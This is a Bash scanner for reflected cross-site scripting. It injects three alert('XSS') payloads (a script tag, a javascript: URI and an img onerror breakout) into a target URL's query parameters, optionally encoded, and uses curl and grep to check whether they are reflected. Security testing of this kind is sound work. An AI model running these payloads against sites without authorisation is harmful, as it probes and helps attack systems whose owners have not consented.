#!/bin/bash

# Tool: Advanced Reflected XSS Finder
# Description: A Bash script to detect potential Reflected XSS vulnerabilities with encoding checks, multiple parameter testing, and context analysis.
# Usage: ./xss_finder.sh <target_url> [options]

# Colors for output
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Check if the user provided a URL
if [ -z "$1" ]; then
    echo "Usage: $0 <target_url> [options]"
    echo "Options:"
    echo "  -p <parameters>    Comma-separated list of parameters to test (default: q)"
    echo "  -e                 Enable encoding checks (URL encoding, HTML encoding)"
    echo "  -c                 Analyze context (HTML, JavaScript)"
    echo "Example: $0 'http://example.com/search?q=test&id=1' -p q,id -e -c"
    exit 1
fi

# Target URL
TARGET_URL="$1"
shift

# Default options
PARAMETERS="q"
ENCODING_CHECKS=false
CONTEXT_ANALYSIS=false

# Parse options
while getopts ":p:ec" opt; do
    case $opt in
        p) PARAMETERS="$OPTARG" ;;
        e) ENCODING_CHECKS=true ;;
        c) CONTEXT_ANALYSIS=true ;;
        *) echo "Invalid option: -$OPTARG" >&2; exit 1 ;;
    esac
done

# Payloads to test for Reflected XSS
PAYLOADS=(
    "<script>alert('XSS')</script>"
    "javascript:alert('XSS')"
    "'\"><img src=x onerror=alert('XSS')>"
)

# Encoding functions
url_encode() {
    echo -n "$1" | perl -pe 's/([^a-zA-Z0-9_.!~*()'\''-])/sprintf("%%%02X", ord($1))/ge'
}

html_encode() {
    echo -n "$1" | perl -pe 's/([<>&'"'"'"])/sprintf("&#x%02X;", ord($1))/ge'
}

# Context analysis functions
analyze_context() {
    local response="$1"
    local payload="$2"

    # Check if payload is reflected in HTML
    if echo "$response" | grep -q "$payload"; then
        echo -e "${YELLOW}[+] Payload reflected in HTML context.${NC}"
    fi

    # Check if payload is reflected in JavaScript
    if echo "$response" | grep -q -E "(<script.*>$payload.*</script>|${payload//</\\<}.*;|=\s*['\"]?$payload['\"]?)"; then
        echo -e "${YELLOW}[+] Payload reflected in JavaScript context.${NC}"
    fi
}

# Test each parameter
IFS=',' read -r -a PARAM_ARRAY <<< "$PARAMETERS"
for param in "${PARAM_ARRAY[@]}"; do
    echo -e "\n${GREEN}[*] Testing parameter: $param${NC}"

    for payload in "${PAYLOADS[@]}"; do
        echo -e "\n${YELLOW}[>] Testing payload: $payload${NC}"

        # Test original payload
        TEST_URL="${TARGET_URL//$param=*/$param=$payload}"
        RESPONSE=$(curl -s -i "$TEST_URL")

        if echo "$RESPONSE" | grep -q "$payload"; then
            echo -e "${RED}[!] Potential Reflected XSS Found!${NC}"
            echo "URL: $TEST_URL"
            echo "Payload: $payload"
            if $CONTEXT_ANALYSIS; then
                analyze_context "$RESPONSE" "$payload"
            fi
        else
            echo -e "${GREEN}[+] No reflection detected.${NC}"
        fi

        # Test URL-encoded payload
        if $ENCODING_CHECKS; then
            ENCODED_PAYLOAD=$(url_encode "$payload")
            TEST_URL="${TARGET_URL//$param=*/$param=$ENCODED_PAYLOAD}"
            RESPONSE=$(curl -s -i "$TEST_URL")

            if echo "$RESPONSE" | grep -q "$ENCODED_PAYLOAD"; then
                echo -e "${RED}[!] Potential Reflected XSS Found (URL-encoded)!${NC}"
                echo "URL: $TEST_URL"
                echo "Payload: $ENCODED_PAYLOAD"
                if $CONTEXT_ANALYSIS; then
                    analyze_context "$RESPONSE" "$ENCODED_PAYLOAD"
                fi
            else
                echo -e "${GREEN}[+] No reflection detected (URL-encoded).${NC}"
            fi
        fi

        # Test HTML-encoded payload
        if $ENCODING_CHECKS; then
            HTML_ENCODED_PAYLOAD=$(html_encode "$payload")
            TEST_URL="${TARGET_URL//$param=*/$param=$HTML_ENCODED_PAYLOAD}"
            RESPONSE=$(curl -s -i "$TEST_URL")

            if echo "$RESPONSE" | grep -q "$HTML_ENCODED_PAYLOAD"; then
                echo -e "${RED}[!] Potential Reflected XSS Found (HTML-encoded)!${NC}"
                echo "URL: $TEST_URL"
                echo "Payload: $HTML_ENCODED_PAYLOAD"
                if $CONTEXT_ANALYSIS; then
                    analyze_context "$RESPONSE" "$HTML_ENCODED_PAYLOAD"
                fi
            else
                echo -e "${GREEN}[+] No reflection detected (HTML-encoded).${NC}"
            fi
        fi
    done
done
